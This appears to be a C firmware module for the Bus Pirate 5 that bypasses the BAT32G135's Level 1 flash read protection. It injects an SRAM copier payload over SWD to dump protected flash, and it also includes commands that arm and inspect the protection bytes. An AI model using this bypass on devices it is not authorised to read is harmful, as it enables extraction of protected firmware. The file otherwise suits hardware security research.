/*
 * SPDX-License-Identifier: MIT
 * Copyright (c) 2026 Thaolia
 *
 * Written for the Bus Pirate 5 firmware (MIT, (c) 2023 Ian Lesnet, Where Labs
 * LLC). Independent reimplementation of a command surface -- no code was copied
 * from the project whose dialect it speaks; that project ships no licence. The
 * payload below was reassembled from its six ARMv6-M mnemonics, each encoded
 * from its format in the ARM ARM; the encodings were then checked against the
 * semantics the dialect documents in prose.
 */
/**
 * @file raiden_bat32.c
 * @brief Reading BAT32G135 flash through its own core, at protection Level 1.
 *
 * Why this works, and it rests on three measured premises rather than on a
 * datasheet clause:
 *   1. At Level 1 the SRAM stays fully readable -- the protection covers the
 *      flash and literally nothing else.
 *   2. The core stays haltable at Level 1.
 *   3. The core can read the flash: it executes from it. The protection hides
 *      the flash from the DEBUGGER's view, not from the CPU's.
 * So a copier placed in SRAM and run by the core moves flash into SRAM, and
 * SRAM is readable. The debugger never reads a flash address.
 *
 * WARNING that decides whether a buffer may be believed: at Level 1 the SRAM
 * this payload overwrites ALREADY holds flash-derived bytes -- the .data
 * section copied there at boot. A pass that silently failed would hand back
 * plausible, flash-shaped content that the payload never read. That is the one
 * failure here which LOOKS exactly like success, and it is why the PC is
 * checked against the trailing BKPT before a single word is emitted.
 */
#include <stdbool.h>
#include <stdint.h>
#include <string.h>

#include "pico/stdlib.h"
#include "pirate.h"
#include "command_struct.h"
#include "system_config.h"

#include "raiden_bat32.h"
#include "raiden_cmd.h"
#include "raiden_proto.h"
#include "raiden_swd.h"
#include "raiden_target.h"

/* --- Payload placement ----------------------------------------------- */

#define PAYLOAD_ADDR 0x20000000u        /* SRAM base: where the copier runs   */
#define PAYLOAD_BUF (PAYLOAD_ADDR + 0x20u) /* destination, above the copier   */
#define PAYLOAD_SP 0x20002000u          /* top of the 8 KB of SRAM            */
#define RAMREAD_MAX_WORDS 1024u         /* 4 KB per pass, the host's ceiling  */

/* The copier, reassembled instruction by instruction. r0 = source, r1 =
 * destination, r2 = word count:
 *
 *   0x00  6803  ldr  r3,[r0]
 *   0x02  600B  str  r3,[r1]
 *   0x04  3004  adds r0,#4
 *   0x06  3104  adds r1,#4
 *   0x08  3A01  subs r2,#1
 *   0x0A  D1F9  bne  -14      ; back to 0x00
 *   0x0C  BE00  bkpt #0
 *   0x0E  BE00  bkpt #0
 *
 * TWO breakpoints, not one: the halt may report the PC on either of them
 * depending on how the core retires the first, so the accepted window covers
 * both. The window is derived from the payload's LENGTH below rather than
 * written as 0x0C/0x0E, because a copier edited to be one instruction longer
 * would move the breakpoints while the literals stayed put -- and the check
 * would then reject every good pass, or worse, accept a bad one.
 */
static const uint32_t payload[] = {
    0x600B6803u,
    0x31043004u,
    0xD1F93A01u,
    0xBE00BE00u,
};

#define PAYLOAD_WORDS ((uint32_t)(sizeof(payload) / sizeof(payload[0])))
#define PAYLOAD_BYTES (PAYLOAD_WORDS * 4u)
#define PC_ACCEPT_LO (PAYLOAD_ADDR + PAYLOAD_BYTES - 4u)
#define PC_ACCEPT_HI (PAYLOAD_ADDR + PAYLOAD_BYTES - 2u)

/* The copier must not reach into its own destination. */
_Static_assert(PAYLOAD_ADDR + PAYLOAD_BYTES <= PAYLOAD_BUF,
               "the payload overlaps the buffer it copies into");

/* Halting a core that is executing application firmware, not one already
 * stopped: it can take several requests. */
#define HALT_MS 500u
/* 4 KB of word-at-a-time copy on a 32 MHz M0+ is microseconds. Half a second
 * is there to bound a payload that never terminates, not to wait for one. */
#define RUN_MS 500u
#define RUN_POLL_US 200u

/* One MEM-AP block, reused across the streaming readback: 64 bytes of .bss on
 * a part already at 87 % RAM. The dialect this speaks keeps a 4 KB buffer for
 * the same job; streaming needs none, because a line is four words and the
 * wire never has to hold the pass. */
static uint32_t blk[RAIDEN_MEM_BLOCK_WORDS];

static bool sram_notice_shown = false;

void raiden_bat32_init(void) {
    sram_notice_shown = false;
}

/* --- The pass -------------------------------------------------------- */

/** Run the copier. true means the buffer at PAYLOAD_BUF may be believed. */
static bool run_payload(uint32_t src, uint32_t words) {
    uint32_t check[PAYLOAD_WORDS];
    uint32_t dhcsr = 0;
    uint32_t xpsr = 0;
    uint32_t demcr_saved = 0;
    uint32_t demcr = 0;
    uint32_t pc = 0;
    uint32_t dfsr = 0;

    // MANDATORY first. At Level 1 a flash read answers ACK=FAULT, which
    // latches STICKYERR and fails EVERY later AP transaction. A caller that
    // probed the part before calling here has already poisoned the link, and
    // the halt below would fail for a reason that has nothing to do with
    // halting -- which is exactly how a Level 1 attempt was first misread.
    (void)raiden_swd_abort_clear();

    if (!raiden_swd_halt(HALT_MS, &dhcsr)) {
        rp_printf("[BAT32-RAM] core halt failed\r\n");
        return false;
    }
    if (!raiden_swd_mem_write(PAYLOAD_ADDR, payload, PAYLOAD_WORDS)) {
        rp_printf("[BAT32-RAM] SRAM not writable -- payload injection refused\r\n");
        return false;
    }

    // Emise ICI, et nulle part plus haut. Avant cette ligne rien n'a ete ecrit
    // dans la cible, et une note posee des l'entree de la commande affirmerait
    // un ecrasement qui n'a pas eu lieu : une passe qui echoue au halt laisse
    // le .data intact. Or ce .data EST le repli qu'on vient chercher quand le
    // contournement rate -- faire croire qu'il est perdu couterait precisement
    // la chose qu'on essayait de sauver.
    //
    // Une fois par session, pas par passe : un dump en fait des centaines, et
    // une note repetee cesse d'etre lue.
    if (!sram_notice_shown) {
        sram_notice_shown = true;
        rp_printf("[BAT32-RAM] NOTE: payload written to target SRAM -- "
                  "0x%08X-0x%08X no longer holds the .data copied from flash at "
                  "boot. A reset restores about 93 %% of it.\r\n",
                  (unsigned)PAYLOAD_ADDR,
                  (unsigned)(PAYLOAD_BUF + 4u * RAMREAD_MAX_WORDS - 1u));
    }

    // Read the copier back before running it. An SRAM that accepted the write
    // and kept something else would run whatever it kept, and the failure
    // would surface as "did not reach BKPT" -- pointing at the mechanism
    // rather than at the memory. All four words, not a sample: a sampled check
    // passes on exactly the corruption it did not sample.
    memset(check, 0, sizeof(check));
    if (!raiden_swd_mem_read_block(PAYLOAD_ADDR, check, PAYLOAD_WORDS)) {
        // Its OWN message. Reporting this as a "mismatch" with two zeros would
        // send the reader after a memory that kept the wrong bytes, when what
        // actually happened is that the link died between the write and the
        // read -- two different benches to go and look at.
        rp_printf("[BAT32-RAM] payload readback failed -- the SRAM took the "
                  "write but did not answer the read\r\n");
        return false;
    }
    for (uint32_t i = 0; i < PAYLOAD_WORDS; i++) {
        if (check[i] != payload[i]) {
            // (expected, got) of the FIRST word that differs.
            rp_printf("[BAT32-RAM] payload readback mismatch (%08X %08X)\r\n",
                      (unsigned)payload[i], (unsigned)check[i]);
            return false;
        }
    }

    if (!raiden_swd_core_reg_write(RAIDEN_REG_SP, PAYLOAD_SP) ||
        !raiden_swd_core_reg_write(RAIDEN_REG_R0, src) ||
        !raiden_swd_core_reg_write(RAIDEN_REG_R1, PAYLOAD_BUF) ||
        !raiden_swd_core_reg_write(RAIDEN_REG_R2, words) ||
        !raiden_swd_core_reg_write(RAIDEN_REG_PC, PAYLOAD_ADDR | 1u)) {
        rp_printf("[BAT32-RAM] core register write failed\r\n");
        return false;
    }

    // The T bit of xPSR. ARMv6-M has no ARM state at all, so a clear T bit is
    // not a mode choice -- it is a HardFault on the very first instruction,
    // which would surface as "did not reach BKPT" and read like the bypass not
    // working on this part. Both return values are checked, deliberately: the
    // dialect this speaks throws them away, and a silent failure here is
    // indistinguishable from a silicon that refuses to execute from SRAM.
    if (!raiden_swd_core_reg_read(RAIDEN_REG_XPSR, &xpsr) ||
        !raiden_swd_core_reg_write(RAIDEN_REG_XPSR, xpsr | (1u << 24))) {
        rp_printf("[BAT32-RAM] core register write failed\r\n");
        return false;
    }

    // Vector catch on HardFault. Without it, "this core will not execute from
    // SRAM" and "the copier looped forever" produce the SAME half-second
    // timeout and cannot be told apart. With it the core stops at once and the
    // PC says where it broke.
    (void)raiden_swd_mem_read_block(RAIDEN_CM_DEMCR, &demcr_saved, 1u);
    demcr = RAIDEN_DEMCR_TRCENA | RAIDEN_DEMCR_VC_HARDERR;
    if (!raiden_swd_mem_write(RAIDEN_CM_DEMCR, &demcr, 1u)) {
        rp_printf("[BAT32-RAM] core register write failed\r\n");
        return false;
    }

    if (!raiden_swd_resume()) {
        rp_printf("[BAT32-RAM] resume failed\r\n");
        return false;
    }

    bool halted = false;
    absolute_time_t deadline = make_timeout_time_ms(RUN_MS);
    for (;;) {
        if (!raiden_swd_read_dhcsr(&dhcsr)) {
            dhcsr = 0;
            break;
        }
        if ((dhcsr & RAIDEN_DHCSR_S_LOCKUP) != 0u) {
            break;
        }
        if ((dhcsr & RAIDEN_DHCSR_S_HALT) != 0u) {
            halted = true;
            break;
        }
        if (time_reached(deadline)) {
            break;
        }
        busy_wait_us_32(RUN_POLL_US);
    }

    // Best effort, and never a reason to fail a pass whose data is already
    // good: leaving vector catch armed would change how the target behaves the
    // next time anything resumes it, with nothing on the wire to say so.
    if (demcr_saved != demcr) {
        (void)raiden_swd_mem_write(RAIDEN_CM_DEMCR, &demcr_saved, 1u);
    }

    if (!halted) {
        rp_printf("[BAT32-RAM] payload did not reach BKPT (%s, DHCSR=0x%08X)\r\n",
                  ((dhcsr & RAIDEN_DHCSR_S_LOCKUP) != 0u) ? "core LOCKED UP"
                                                          : "core still running",
                  (unsigned)dhcsr);
        (void)raiden_swd_halt(HALT_MS, NULL); // leave it stopped, not running
        return false;
    }

    if (!raiden_swd_core_reg_read(RAIDEN_REG_PC, &pc)) {
        rp_printf("[BAT32-RAM] PC unreadable after halt -- refusing the buffer\r\n");
        return false;
    }
    if (pc < PC_ACCEPT_LO || pc > PC_ACCEPT_HI) {
        // THE check. A buffer nobody vouches for is the only failure that
        // looks like a success: at Level 1 that SRAM plausibly holds the
        // .data copied from flash at boot, i.e. flash-derived bytes this
        // payload never read. Undetectable from the host side.
        (void)raiden_swd_mem_read_block(RAIDEN_CM_DFSR, &dfsr, 1u);
        rp_printf("[BAT32-RAM] halted at PC=0x%08X, not the trailing BKPT "
                  "(DFSR=0x%08X) -- buffer would not be flash data\r\n",
                  (unsigned)pc, (unsigned)dfsr);
        return false;
    }
    return true;
}

/* --- Command --------------------------------------------------------- */

static void cmd_ramread(int argc, char* argv[]) {
    uint32_t src = 0;
    uint32_t words = 4u; // the dialect's default

    if (argc < 4 || !raiden_parse_hex32(argv[3], &src)) {
        rp_err("Usage: SWD BAT32 RAMREAD <addr> [words]");
        return;
    }
    // Base 0 for the count, base 16 for the address: the split is the
    // dialect's, and it is asymmetric on purpose. A count read as hex would
    // turn RAMREAD 0x0 10 into sixteen words without failing.
    if (argc >= 5 && !raiden_parse_u32(argv[4], &words)) {
        rp_err("Invalid word count");
        return;
    }
    if (words < 1u || words > RAMREAD_MAX_WORDS) {
        rp_err("words must be 1-%u (4 KB max per pass)", (unsigned)RAMREAD_MAX_WORDS);
        return;
    }
    if ((src & 3u) != 0u) {
        // Checked here AND nowhere else it could be reached from: ldr r3,[r0]
        // faults on an unaligned address, and the symptom would come back as
        // "payload did not reach BKPT" -- i.e. as "the bypass does not work"
        // when the only thing wrong is the argument.
        rp_err("address 0x%08X must be word-aligned", (unsigned)src);
        return;
    }
    if (!raiden_swd_ensure_connected()) {
        return; // ensure_connected() has already said why
    }

    if (!run_payload(src, words)) {
        rp_err("RAMREAD failed (see log for which step)");
        return;
    }

    // Stream the target buffer back. Never accumulated: 1024 words is 256
    // lines, roughly 12.8 KB, against a 1 KB TX FIFO that DROPS rather than
    // blocks. Emitting a block at a time puts one block of bit-banging between
    // bursts, which is what drains the FIFO -- the same rhythm SWD READ uses.
    uint32_t done = 0;
    while (done < words) {
        uint32_t at = PAYLOAD_BUF + done * 4u;
        uint32_t n = raiden_swd_block_words(at, words - done);
        if (!raiden_swd_mem_read_block(at, blk, n)) {
            (void)raiden_swd_abort_clear();
            if (!raiden_swd_mem_read_block(at, blk, n)) {
                rp_printf("[BAT32-RAM] readback of the target buffer failed at "
                          "0x%08X\r\n", (unsigned)at);
                rp_err("RAMREAD failed (see log for which step)");
                return;
            }
        }
        // Lines are labelled with the SOURCE address, never with where the
        // copy landed. The host keys every word on its line's own prefix and
        // returns nothing at all if one requested address is missing -- a line
        // labelled 0x20000020 for flash word 0 would lose the entire pass.
        for (uint32_t i = 0; i < n; i += 4u) {
            uint32_t k = ((n - i) > 4u) ? 4u : (n - i);
            rp_words_line(src + (done + i) * 4u, &blk[i], k);
        }
        done += n;
    }
    // LAST, after every data line. The host stops reading a reply on its first
    // marker; a trailer emitted per block, as the hexdump path does, would
    // leave the parser racing a drain loop for the rest of the pass.
    rp_ok("%u words read via core payload", (unsigned)words);
}


/* --- SWD OPT : les octets d'option, en lecture seule ------------------ */

#define OPT_CLUSTER0 0x000000C0u  /* mot portant OCDEN a 0x000000C3 */
#define OPT_CLUSTER1 0x000001C0u  /* miroir boot-swap, OCDEN a 0x000001C3 */
#define OPT_OCDM_BTEN 0x00500004u /* OCDM = octet 0, BTEN = bit 0 de l'octet 1 */
#define OPT_DBGSTOPCR 0x4001B004u
#define OPT_SWDIS (1u << 24)
#define OCDEN_PROTECTED 0xC3u
#define OCDM_LEVEL2 0x3Cu

/** Une lecture d'octet d'option, qui NETTOIE derriere elle si elle faute.
 *
 * Indispensable ici : au Level 1 une lecture flash rend ACK=FAULT, ce qui
 * VERROUILLE le DP par STICKYERR. Sans ce nettoyage, la premiere lecture
 * refusee ferait echouer toutes les suivantes -- et le rapport dirait que la
 * data flash et DBGSTOPCR sont illisibles alors que seule la code flash l'est.
 */
static bool opt_read(uint32_t addr, uint32_t* out) {
    if (raiden_swd_mem_read_block(addr, out, 1u)) {
        return true;
    }
    (void)raiden_swd_abort_clear();
    return false;
}

/* --- Option-byte programming ------------------------------------------
 *
 * Registers and key values come from the BAT32G135 User Manual section 29.4 as
 * transcribed in the host project's docs/07_BAT32G135_FAULTYCAT.md. Nothing was
 * copied from the raiden-pico firmware, which carries no licence file.
 *
 * The PROGRAM key order (FLOPMD1 <- 0xAA then FLOPMD2 <- 0x55) is the REVERSE
 * of the erase order. Swapping them does not fail loudly: the part simply does
 * not program, which reads as a chip that refused.
 */
#define FL_FLSTS        0x40020000u
#define FL_FLOPMD1      0x40020004u
#define FL_FLOPMD2      0x40020008u
#define FL_FLERMD       0x4002000Cu
#define FL_FLPROT       0x40020020u

#define FLPROT_UNLOCK   0xF1u   /* PRKEY[7:1]=0x78 + WRP=1                  */
#define FLPROT_RELOCK   0xF0u   /* what the vendor driver leaves behind     */
#define FLOPMD1_PROGRAM 0xAAu
#define FLOPMD2_PROGRAM 0x55u

/* ★ QUEL OCDEN ? Celui du cluster que BTEN designe, jamais un cluster presume.
 *
 * ⚠⚠ Corrige le 2026-09-22 apres une lecture de `SWD OPT` sur le banc. Cette
 * fonction ecrivait le cluster 0 EN DUR, en se justifiant par « ce binmode ne
 * sait pas relire BTEN ». Depuis `SWD OPT`, il sait. Armer le cluster qui ne
 * gouverne pas laisserait une puce qui PARAIT non verrouillee alors qu'un
 * second exemplaire de l'octet dit le contraire -- et rien, au banc, ne
 * distinguerait ce cas d'un armement qui n'a pas pris. */
#define OCDEN_IN_CLUSTER 0x03u   /* OCDEN = 4e octet du mot de cluster */

/** Une ecriture de registre du controleur flash : 32 bits, toujours.
 *
 * Existe pour que la largeur soit un choix VISIBLE a l'appel plutot qu'un
 * detail du helper choisi. C'est en la confondant avec la largeur de la donnee
 * que la sequence d'armement est restee sans effet.
 */
static bool fmc_write32(uint32_t addr, uint32_t value) {
    return raiden_swd_mem_write(addr, &value, 1u);
}

/* Halter un coeur qui execute du firmware applicatif, pas un coeur deja
 * arrete : il faut plusieurs requetes. Meme budget que la passe RAMREAD. */
#define ARM_HALT_MS 500u

#define PROGRAM_POLL_MS 2u
#define PROGRAM_TRIES   50u

/** Read OCDEN back from @p addr. The word read is masked down to its byte lane. */
static bool ocden_read(uint32_t addr, uint8_t* out) {
    uint32_t word = 0;
    if (!opt_read(addr & ~3u, &word)) {
        return false;
    }
    *out = (uint8_t)((word >> (8u * (addr & 3u))) & 0xFFu);
    return true;
}

/** Which OCDEN governs? Rend false si BTEN est illisible -- et c'est un REFUS,
 *  pas un defaut: presumer le cluster est precisement la faute corrigee ici. */
static bool ocden_addr_governing(uint32_t* addr, unsigned* bten_out) {
    uint32_t om = 0;
    if (!opt_read(OPT_OCDM_BTEN, &om)) {
        return false;
    }
    unsigned bten = (unsigned)((om >> 8) & 1u);
    /* BTEN=0 => boot-swap ACTIF => c'est le cluster 1 qui gouverne. */
    *addr = ((bten == 0u) ? OPT_CLUSTER1 : OPT_CLUSTER0) | OCDEN_IN_CLUSTER;
    *bten_out = bten;
    return true;
}

/** SWD BAT32 ARM CONFIRM -- OCDEN 0xFF -> 0xC3, i.e. protection Level 1.
 *
 * ⚠⚠ IRREVERSIBLE without a chip erase. Once OCDEN reads 0xC3 the code flash is
 * unreadable through the debugger, and the ONLY way back is CHIPERASE -- which
 * this binmode does not implement. Dump and VERIFY the dump first: the plaintext
 * of the application exists nowhere else.
 *
 * ⚠ Completion is confirmed by READING OCDEN BACK, not by polling FLSTS.OVF.
 * The host project documents OVF by name but not by bit position, and inventing
 * a mask would be exactly the kind of unsourced constant this bench refuses. A
 * read-back proves the outcome rather than a status bit's meaning.
 */
static void cmd_arm(int argc, char* argv[]) {
    if (argc < 4 || strcmp(argv[argc - 1], "CONFIRM") != 0) {
        rp_err("SWD BAT32 ARM is destructive and requires a literal CONFIRM as the "
               "last token. It sets Level 1; only a chip erase undoes it, and this "
               "binmode has no chip erase");
        return;
    }

    /* ★ BTEN d'abord, avant toute autre lecture et bien avant toute ecriture.
     * Un refus ici coute un message; un mauvais cluster coute une puce dont
     * l'etat ne se lit plus nulle part. */
    uint32_t ocden_addr = 0;
    unsigned bten = 0;
    if (!ocden_addr_governing(&ocden_addr, &bten)) {
        rp_err("Cannot read BTEN (0x%08X): refusing to arm. Which OCDEN governs "
               "depends on it, and writing the wrong cluster leaves a part that "
               "LOOKS unlocked while its other copy says otherwise. Check the link "
               "with SWD OPT first",
               (unsigned)(OPT_OCDM_BTEN + 1u));
        return;
    }

    /* ⚠⚠ Un mot d'octets d'option a ZERO n'existe pas -- et c'est ce que la
     * flash rend quand le debugger n'a PAS le droit de la lire.
     *
     * Mesure du 2026-09-22 : sur une piece au Level 1, ce banc rend
     * 0x00000000 avec un ACK OK la ou le raiden rendait ACK=0x4. Meme etat,
     * surface differente. ocden_read() lisait donc 0x00, en concluait « pas
     * protegee », et lancait la sequence de programmation SUR UNE PIECE DEJA
     * VERROUILLEE. Ici c'est sans effet, la programmation etant refusee au
     * Level 1 -- mais programmer un octet d'option sur la foi d'une lecture
     * qu'on ne peut pas croire est exactement ce que le message ci-dessous
     * pretend refuser.
     *
     * ⚠ 0xFFFFFFFF reste ACCEPTE, a la difference de probe_level() qui refuse
     * les deux : c'est la valeur LEGITIME d'un mot d'octets d'option vierge.
     * Les octets d'option ne se programment que de 1 vers 0 ; un mot a zero
     * voudrait dire WDT, LVD, HOCO et OCDEN tous programmes a 0x00, ce que
     * personne ne fait. Les deux regles different parce que les deux
     * contextes different -- une table de vecteurs effacee vaut 0xFFFFFFFF de
     * plein droit, un mot d'octets d'option a zero, jamais. */
    uint32_t cluster = 0;
    if (opt_read(ocden_addr & ~3u, &cluster) && cluster == 0u) {
        rp_err("Option-byte word at 0x%08X reads 0x00000000: that is not a value, "
               "it is what the flash returns when the debugger may not read it. "
               "Refusing to program blind -- the part is very likely ALREADY at "
               "Level 1. Confirm with SWD OPT and the host's flash/SRAM contrast",
               (unsigned)(ocden_addr & ~3u));
        return;
    }

    uint8_t before = 0;
    if (!ocden_read(ocden_addr, &before)) {
        rp_err("Cannot read OCDEN at 0x%08X: the debug port is not answering there. "
               "Refusing to program an option byte blind", (unsigned)ocden_addr);
        return;
    }
    if (before == OCDEN_PROTECTED) {
        rp_ok("OCDEN at 0x%08X already 0xC3 (Level 1) -- nothing to do",
              (unsigned)ocden_addr);
        return;
    }

    /* ⚠⚠ Nettoyer STICKYERR AVANT toute chose. Une lecture d'octet d'option
     * qui a faute -- SWD OPT sur une piece partiellement illisible, ou le
     * sondage qui precede -- verrouille le DP, et TOUTE transaction AP
     * suivante echoue. La sequence ci-dessous echouerait alors pour une raison
     * qui n'a rien a voir avec le controleur flash. */
    (void)raiden_swd_abort_clear();

    /* ⚠⚠ Halter le coeur, et REFUSER s'il ne s'arrete pas. Le driver du
     * fondeur s'execute depuis la RAM, interruptions coupees, precisement
     * parce que le CPU ne doit pas aller chercher ses instructions dans un
     * flash qu'on programme. Par SWD, l'equivalent est un coeur halte -- sans
     * quoi le firmware de la cible continue de s'executer dans le tableau
     * qu'on ecrit. Un refus ici coute un message ; passer outre coute une
     * piece a moitie programmee. */
    if (!raiden_swd_halt(ARM_HALT_MS, NULL)) {
        rp_err("Core halt failed: refusing to program an option byte while the "
               "CPU is fetching from the array being written");
        return;
    }

    /* ⚠⚠ Les registres du controleur flash s'ecrivent en 32 BITS, seul l'octet
     * de donnee passe en largeur octet.
     *
     * Ils etaient tous les quatre ecrits en octet jusqu'au 2026-09-22, et c'est
     * la panne qui a fait rendre "the write did not take" a chaque tentative :
     * un registre peripherique qui n'accepte que le mot IGNORE une ecriture
     * d'octet, sans fauter. Le bus acquitte, FLPROT ne deverrouille jamais,
     * l'octet n'est pas programme -- et rien dans la reponse ne le dit.
     * Le firmware raiden ecrit bien ces quatre-la en mem_write32 et reserve
     * mem_write8 a la donnee (src/swd.c, swd_bat32_flash_program).
     *
     * L'octet de donnee, lui, DOIT rester en largeur octet : OCDEN partage son
     * mot de 32 bits avec les octets d'option WDT, LVD et HOCO, et une
     * ecriture de mot les emporterait tous les quatre. */
    if (!fmc_write32(FL_FLPROT, FLPROT_UNLOCK) ||
        !fmc_write32(FL_FLOPMD1, FLOPMD1_PROGRAM) ||
        !fmc_write32(FL_FLOPMD2, FLOPMD2_PROGRAM) ||
        !raiden_swd_mem_write_byte(ocden_addr, OCDEN_PROTECTED)) {
        (void)fmc_write32(FL_FLPROT, FLPROT_RELOCK);
        rp_err("Option-byte write sequence failed on the bus -- OCDEN may be "
               "unchanged OR half-written. Read it back with SWD OPT before doing "
               "anything else");
        return;
    }

    uint8_t after = 0;
    bool armed = false;
    for (uint32_t i = 0; i < PROGRAM_TRIES; i++) {
        busy_wait_ms(PROGRAM_POLL_MS);
        if (ocden_read(ocden_addr, &after) && after == OCDEN_PROTECTED) {
            armed = true;
            break;
        }
    }

    /* Leave the flash controller as the vendor driver does, whatever happened. */
    (void)fmc_write32(FL_FLERMD, 0x00u);
    (void)fmc_write32(FL_FLPROT, FLPROT_RELOCK);

    if (!armed) {
        rp_err("OCDEN at 0x%08X still 0x%02X after %u ms: the write did not take",
               (unsigned)ocden_addr, (unsigned)after,
               (unsigned)(PROGRAM_TRIES * PROGRAM_POLL_MS));
        return;
    }
    rp_ok("OCDEN at 0x%08X (cluster %u, BTEN=%u) 0x%02X -> 0xC3, protection Level 1 "
          "(effective at the next reset)",
          (unsigned)ocden_addr, (bten == 0u) ? 1u : 0u, bten, (unsigned)before);
}

static void cmd_help(void) {
    rp_send("SWD BAT32 RAMREAD <addr> [words] - read flash VIA the core (L1 bypass)\r\n");
    rp_send("  RAMREAD is read-only on FLASH but OVERWRITES target SRAM "
            "0x20000000-0x2000101F\r\n");
    rp_send("SWD BAT32 ARM CONFIRM    - OCDEN 0xFF->0xC3 = protection Level 1\r\n");
    rp_send("  IRREVERSIBLE here: only a chip erase undoes it, and this binmode\r\n");
    rp_send("  has none. Dump and VERIFY the dump first.\r\n");
    rp_send("  The other destructive verbs -- PROGRAM, WRITE, PATTERN,\r\n");
    rp_send("  SECTORERASE, CHIPERASE, DISARM -- are DELIBERATELY not\r\n");
    rp_send("  implemented here. Recovering a Level 1 needs the raiden.\r\n");
}

void raiden_bat32_command(int argc, char* argv[]) {
    if (raiden_target_family() != RAIDEN_TARGET_BAT32) {
        // Checked before anything else, as the dialect does. Injecting a
        // Cortex-M0+ copier into an nRF52's SRAM would not read its flash; it
        // would overwrite memory on a part nobody asked about.
        rp_err("SWD BAT32 requires TARGET BAT32 first");
        return;
    }
    if (argc < 3) {
        cmd_help();
        return;
    }
    if (strcmp(argv[2], "RAMREAD") == 0) {
        cmd_ramread(argc, argv);
        return;
    }
    if (strcmp(argv[2], "ARM") == 0) {
        cmd_arm(argc, argv);
        return;
    }
    rp_err("Unknown SWD BAT32 operation '%s' (this binmode implements RAMREAD and "
           "ARM; the other destructive verbs are deliberately absent)", argv[2]);
}


void raiden_bat32_opt(void) {
    uint32_t c0 = 0, c1 = 0, om = 0, dbg = 0;
    bool has_c0, has_c1, has_om, has_dbg;
    uint8_t ocden0, ocden1, ocdm, ocden;
    unsigned bten;
    bool swap;

    if (raiden_target_family() != RAIDEN_TARGET_BAT32) {
        rp_err("SWD OPT is implemented for BAT32 only in this binmode "
               "(TARGET BAT32 first)");
        return;
    }
    if (!raiden_swd_ensure_connected()) {
        return;
    }

    has_c0 = opt_read(OPT_CLUSTER0, &c0);
    has_c1 = opt_read(OPT_CLUSTER1, &c1);
    has_om = opt_read(OPT_OCDM_BTEN, &om);
    has_dbg = opt_read(OPT_DBGSTOPCR, &dbg);

    if (!has_c0 && !has_c1 && !has_om && !has_dbg) {
        // Rien du tout : ce n'est pas une puce protegee, c'est un lien mort.
        // Les distinguer importe -- au Level 1 la data flash ET DBGSTOPCR
        // restent lisibles, seule la code flash se ferme.
        rp_err("SWD OPT read nothing at all (ACK=0x%X) -- suspect the link, "
               "not the protection: at Level 1 DBGSTOPCR still answers",
               (unsigned)raiden_swd_last_ack());
        return;
    }

    ocden0 = (uint8_t)((c0 >> 24) & 0xFFu);
    ocden1 = (uint8_t)((c1 >> 24) & 0xFFu);
    ocdm = (uint8_t)(om & 0xFFu);
    bten = (unsigned)((om >> 8) & 1u);

    if (has_c0) {
        rp_printf("Option bytes cluster 0 (0x%08X) = 0x%08X\r\n",
                  (unsigned)OPT_CLUSTER0, (unsigned)c0);
        rp_printf("  OCDEN (0x%08X) = 0x%02X\r\n",
                  (unsigned)(OPT_CLUSTER0 + 3u), (unsigned)ocden0);
    } else {
        rp_send("Option bytes cluster 0: unreadable (code flash inaccessible at "
                "the current protection level)\r\n");
    }
    if (has_c1) {
        rp_printf("Option bytes cluster 1 / boot-swap mirror (0x%08X) = 0x%08X\r\n",
                  (unsigned)OPT_CLUSTER1, (unsigned)c1);
        rp_printf("  OCDEN (0x%08X) = 0x%02X\r\n",
                  (unsigned)(OPT_CLUSTER1 + 3u), (unsigned)ocden1);
    }
    if (has_om) {
        rp_printf("OCDM (0x%08X) = 0x%02X\r\n",
                  (unsigned)OPT_OCDM_BTEN, (unsigned)ocdm);
        rp_printf("BTEN (0x%08X) = %u (boot-swap %s)\r\n",
                  (unsigned)(OPT_OCDM_BTEN + 1u), bten,
                  (bten == 0u) ? "ACTIVE -- cluster 1 governs, not cluster 0"
                               : "disabled");
    } else {
        rp_send("OCDM/BTEN: unreadable (data flash inaccessible at the current "
                "protection level)\r\n");
    }
    if (has_dbg) {
        rp_printf("DBGSTOPCR (0x%08X) = 0x%08X  SWDIS=%u (%s)\r\n",
                  (unsigned)OPT_DBGSTOPCR, (unsigned)dbg,
                  (unsigned)((dbg & OPT_SWDIS) ? 1u : 0u),
                  (dbg & OPT_SWDIS) ? "SWD DISABLED by firmware" : "SWD enabled");
    }

    // Le boot-swap DEPLACE la question : a BTEN=0 c'est le cluster 1 qui
    // gouverne. Un exemplaire dont le boot-swap est actif a donc sa protection
    // decidee par un octet que personne ne regarde.
    swap = has_om && (bten == 0u);
    if (swap ? !has_c1 : !has_c0) {
        rp_send("Could not determine protection level (governing option byte "
                "unreadable)\r\n");
    } else {
        ocden = swap ? ocden1 : ocden0;
        if (ocden != OCDEN_PROTECTED) {
            rp_printf("Deduced protection level: Level 0 (flash open) "
                      "(from cluster %u, OCDEN=0x%02X)\r\n",
                      swap ? 1u : 0u, (unsigned)ocden);
        } else if (!has_om) {
            rp_printf("Deduced protection level: Level 1 or 2 -- OCDM unreadable, "
                      "the two cannot be told apart here (from cluster %u, "
                      "OCDEN=0x%02X)\r\n", swap ? 1u : 0u, (unsigned)ocden);
        } else if (ocdm != OCDM_LEVEL2) {
            rp_printf("Deduced protection level: Level 1 (chip-erase only) "
                      "(from cluster %u, OCDEN=0x%02X)\r\n",
                      swap ? 1u : 0u, (unsigned)ocden);
        } else {
            rp_printf("Deduced protection level: Level 2 (no flash access via "
                      "debugger) (from cluster %u, OCDEN=0x%02X)\r\n",
                      swap ? 1u : 0u, (unsigned)ocden);
        }
        if (swap) {
            rp_printf("  NOTE: boot-swap is ACTIVE -- fault/write target is "
                      "0x%08X, NOT 0x%08X\r\n",
                      (unsigned)(OPT_CLUSTER1 + 3u), (unsigned)(OPT_CLUSTER0 + 3u));
        }
    }

    // ⚠ Ce que cette ligne ne dit PAS, et le dire ici plutot que dans une doc
    // que l'operateur n'aura pas sous les yeux : ces octets vivent en code
    // flash, donc illisibles precisement au Level 1. Ce verdict DECLARE ; seul
    // le contraste flash/SRAM cote hote MESURE.
    rp_ok("option bytes read -- declared, not measured");
}
